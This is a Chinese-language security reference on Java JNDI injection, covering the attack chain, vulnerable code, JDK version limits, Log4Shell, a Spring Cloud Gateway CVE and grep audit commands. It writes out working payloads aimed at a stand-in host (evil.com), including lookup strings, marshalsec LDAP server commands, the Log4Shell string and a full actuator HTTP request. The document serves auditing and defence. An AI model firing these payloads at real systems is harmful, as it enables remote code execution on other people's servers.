# JNDI 注入详解

## 目录

- [1. JNDI 基础](#1-jndi-基础)
- [2. JNDI 注入原理](#2-jndi-注入原理)
- [3. JDK 版本与利用条件](#3-jdk-版本与利用条件)
- [4. JNDI + 反序列化组合利用](#4-jndi--反序列化组合利用)
- [5. Log4j JNDI 注入](#5-log4j-jndi-注入)
- [6. Spring JNDI 注入](#6-spring-jndi-注入)

---

## 1. JNDI 基础

### JNDI 架构

```
JNDI (Java Naming and Directory Interface) = Java 命名和目录服务接口

核心流程:
1. InitialContext.lookup(name) → 查找对象
2. 根据 name 的 scheme 选择 SPI (Service Provider Interface)
   - ldap:// → LDAP SPI
   - rmi:// → RMI SPI
   - dns:// → DNS SPI
   - jnp:// → JBoss Naming SPI
3. SPI 连接到对应的服务 → 获取对象 → 返回给应用
```

### JNDI 支持的 SPI

| Scheme | SPI 实现 | 说明 |
|--------|---------|------|
| `ldap://` | `com.sun.jndi.ldap.LdapCtxFactory` | LDAP 协议 |
| `ldaps://` | `com.sun.jndi.ldap.LdapCtxFactory` | LDAPS |
| `rmi://` | `com.sun.jndi.rmi.registry.RegistryContextFactory` | RMI 协议 |
| `dns://` | `com.sun.jndi.dns.DnsContextFactory` | DNS 协议 |
| `iiop://` | `com.sun.jndi.cosnaming.CNCtxFactory` | CORBA 协议 |

---

## 2. JNDI 注入原理

### 经典 JNDI 注入链

```
攻击流程：

Step 1: 攻击者控制 lookup() 参数
  ctx.lookup("ldap://evil.com:1389/Exploit");

Step 2: Java 连接 LDAP 服务器 evil.com:1389

Step 3: LDAP 服务器返回 Reference
  Reference ref = new Reference("Exploit", "Exploit", "http://evil.com/");
  // javaClassName, javaFactory, javaFactoryLocation

Step 4: Java 从 http://evil.com/Exploit.class 远程加载类

Step 5: 实例化 Exploit 类 → 执行 static 代码块 → RCE
```

### 漏洞代码模式

```java
// 模式 1: lookup 参数完全可控 (最危险)
@PostMapping("/lookup")
public Object lookup(@RequestParam String url) throws Exception {
    InitialContext ctx = new InitialContext();
    return ctx.lookup(url);  // ← ldap://evil.com/Exploit
}

// 模式 2: PROVIDER_URL 用户可控
Hashtable<String, String> env = new Hashtable<>();
env.put(Context.PROVIDER_URL, request.getParameter("url"));  // 可控
DirContext ctx = new InitialDirContext(env);

// 模式 3: 间接 lookup (通过其他框架)
// Spring LDAP
ldapTemplate.authenticate(base, filter, password);
// 若 base 或 filter 可控 → LDAP 注入
```

---

## 3. JDK 版本与利用条件

### JDK 版本限制矩阵

| JDK 版本 | `ldap://` 远程加载 | `rmi://` 远程加载 | 本地 gadget | 说明 |
|---------|-------------------|-------------------|-------------|------|
| ≤ 6u132 | ✅ | ✅ | N/A | 无限制 |
| 7u0-7u21 | ✅ | ✅ | N/A | 无限制 |
| 8u0-8u113 | ✅ | ✅ | N/A | 无限制 |
| 8u113-8u121 | ✅ | ⚠️ trustURLCodebase | N/A | RMI 受限制 |
| 8u121-8u191 | ⚠️ trustURLCodebase | ⚠️ trustURLCodebase | N/A | 两端均需配置 |
| ≥ 8u191 | ❌ | ❌ | ✅ 需 gadget | 彻底禁止远程加载 |
| 11.0.1+ | ❌ | ❌ | ✅ 需 gadget | 同 8u191 |
| 17+ | ❌ | ❌ | ✅ 需 gadget | 同 8u191 |

### JDK 安全配置检查

```bash
# 检查 JDK 版本
java -version

# 检查 trustURLCodebase 配置
grep -rn "trustURLCodebase\|com.sun.jndi.ldap.object.trustURLCodebase\|com.sun.jndi.rmi.object.trustURLCodebase" \
  --include="*.java" --include="*.properties" --include="*.xml"

# 检查是否设置了自定义 TrustURLCodebase
grep -rn "System.setProperty.*trustURLCodebase" --include="*.java"
```

### 不同 JDK 版本的利用策略

```java
// JDK ≤ 8u113: 直接利用
String url = "ldap://evil.com:1389/Exploit";
ctx.lookup(url);  // → 远程加载 → RCE

// JDK 8u113-8u191: 需 trustURLCodebase=true
// 检查应用是否设置了此属性
if ("true".equals(System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase"))) {
    // 仍需远程加载
}

// JDK ≥ 8u191: 无法远程加载，改为 JNDI + 本地 gadget
// 攻击者搭建恶意 LDAP → 返回序列化对象 → 目标反序列化 → 触发 gadget → RCE
// LDAP 通过 javaSerializedData 属性返回序列化 payload
```

---

## 4. JNDI + 反序列化组合利用

### JDK ≥ 8u191 的攻击思路

虽然远程 Codebase 被禁止，但 LDAP 服务器仍然可以返回序列化对象：

```
攻击流程 (JDK ≥ 8u191):

Step 1: lookup("ldap://evil.com/Exploit")

Step 2: LDAP 服务器返回带有 javaSerializedData 属性的 entry
  attributes.add("javaSerializedData", serialize(ysoserialPayload));

Step 3: Java 反序列化 javaSerializedData 中的 payload

Step 4: 反序列化触发本地 gadget 链 → RCE

关键前提：目标 classpath 中必须有可用的 gadget 库
```

### 本地 Gadget 优先级

```
JNDI + 本地 gadget 场景下，按优先级：
1. CommonsBeanutils1 → 无 JDK 限制！
2. CommonsCollections5/6/7 → 无 JDK 限制！
3. Spring1/2 → 需 spring-beans
4. URLDNS → 至少可确认漏洞
```

### marshalsec JNDI 利用工具

```bash
# 启动恶意 LDAP 服务器
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://evil.com/#Exploit 1389

# 对于 JDK ≥ 8u191: 使用 LDAP + 序列化模式
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://evil.com/#Exploit 1389 --serialPayload
```

---

## 5. Log4j JNDI 注入

### Log4j CVE-2021-44228 (Log4Shell)

```java
// Log4j 2.x 中的 JNDI 注入
logger.error("${jndi:ldap://evil.com/Exploit}");

// 触发条件：
// 1. Log4j 2.x ≤ 2.14.1
// 2. 日志消息中包含 ${jndi:ldap://...}
// 3. 目标出网 (或 trustURLCodebase=true + JDK < 8u191)
```

### 审计检查清单

```bash
# 1. 检查 Log4j 版本
find . -name "log4j-core-*.jar"
grep "log4j" pom.xml

# 2. 检查是否使用了 JndiLookup
find . -name "log4j-core-*.jar" -exec jar -tf {} \; | grep JndiLookup

# 3. 检查是否移除了 JndiLookup
# Log4j 2.16.0+ 默认禁用 JNDI
# Log4j 2.17.0+ 彻底移除 JNDI

# 4. 检查 log4j2.formatMsgNoLookups
grep -rn "formatMsgNoLookups\|log4j2.noFormatMsgLookups" --include="*.properties" --include="*.xml"
```

### Log4j 版本与影响

| Log4j 版本 | CVE | 影响 |
|-----------|-----|------|
| 2.0-2.14.1 | CVE-2021-44228 | JNDI 注入 (Log4Shell) |
| 2.15.0 | CVE-2021-45046 | 绕过 (非默认配置) |
| 2.16.0 | 安全 (默认禁用 JNDI) | 需配置开启 |
| 2.17.0+ | 安全 (移除 JNDI) | 不可利用 |

---

## 6. Spring JNDI 注入

### Spring Cloud Gateway CVE-2022-22947

```bash
# Spring Cloud Gateway + Actuator 暴露 → 可通过 /actuator/gateway/routes 添加路由
# 路由过滤器中使用 SpEL 表达式 → RCE

# JNDI 变体:
POST /actuator/gateway/routes/evil
Content-Type: application/json

{
  "id": "evil",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "X-Exploit",
      "value": "#{T(javax.naming.InitialContext).newInstance().lookup('ldap://evil.com/Exploit')}"
    }
  }],
  "uri": "http://example.com"
}
```

### Spring Framework JNDI 配置

```properties
# 检查 Spring 的 JNDI 配置
spring.jndi.ignore=true  # ✅ 安全 (Spring Boot 2.6+ 默认)

# 其他 JNDI 端点
spring.datasource.jndi-name=java:comp/env/jdbc/mydb  # ⚠️ 检查是否可控
```

### 搜索正则

```bash
# JNDI lookup 所有场景
grep -rnE "\.lookup\(|InitialContext|InitialDirContext|InitialLdapContext|DirContext" --include="*.java"

# JNDI 注入特征
grep -rnE "ldap://|rmi://|jndi:" --include="*.java" --include="*.xml" --include="*.properties" | grep -v "test\|Test\|example"

# Log4j JNDI 特征
grep -rnE "JndiLookup|JndiManager|log4j.*jndi|\$\{jndi:" --include="*.java" --include="*.xml"
```
